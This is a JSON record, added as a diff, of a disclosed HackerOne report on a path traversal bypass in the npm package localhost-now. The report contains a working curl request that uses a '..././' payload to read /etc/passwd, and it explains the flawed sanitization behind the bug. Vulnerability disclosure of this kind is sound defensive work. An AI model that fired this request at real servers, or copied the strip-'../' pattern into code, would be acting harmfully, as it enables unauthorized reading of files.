@@ -1,0 +1,129 @@
+{
+  "id": 329837,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjk4Mzc=",
+  "url": "https://hackerone.com/reports/329837",
+  "title": "Bypass to defective fix of Path Traversal ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-03-25T23:16:51.194Z",
+  "submitted_at": "2018-03-25T23:16:51.194Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "caioluders",
+    "url": "/caioluders",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/dj1bj162w9m51oskm97usq7dw652/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-05-11T15:45:42.422Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-05-11T15:45:33.383Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a Path Traversal vulnerability in localhost-now. It allows to read arbitrary files on the server. This is a bypass on the mitigation of #312889 .\n\n# Module\n\n**module name:** localhost-now\n**version:** 1.0.2\n**npm page:** `https://www.npmjs.com/package/localhost-now`\n\n## Module Description\n\n>Am I the only one who is lazy to install Apache just for testing some HTML or JavaScript code (like XHR) ?\n\n## Module Stats\n\n[13] downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nA path traversal attack aims to access files and directories that are stored outside the web root folder. \n\n## Steps To Reproduce:\n\n* Install localhost-now\n* Run localhost-now on directory\n```\nec2-user@kali:~$ localhost 5432\nWeb Server started on localhost:5432\n```\n* Execute the curl command \n```\n$ curl -v --path-as-is \"http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd\"\nroot:x:0:0:root:/root:/usr/bin/fish\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n```\n\nThe problem resides on the line [17](https://github.com/DCKT/localhost-now/blob/master/lib/app.js#L17) as the code just delete all the '../' strings , allowing a payload like \"..././\" to be transformed back in \"../\" .\n\n## Supporting Material/References:\n\n- OS version :Linux kali 4.13.0\n- NodeJS version : v8.10.0\n- NPM version : 5.6.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: No\n- I opened an issue in the related repository: No\n\n## Impact\n\nThe attacker can read remotely all files on the server.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-06-10T15:45:33.460Z",
+  "allow_singular_disclosure_after": -249694733.351273,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "herrera",
+    "z32",
+    "khizer47",
+    "0x08"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5908,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "localhost-now",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
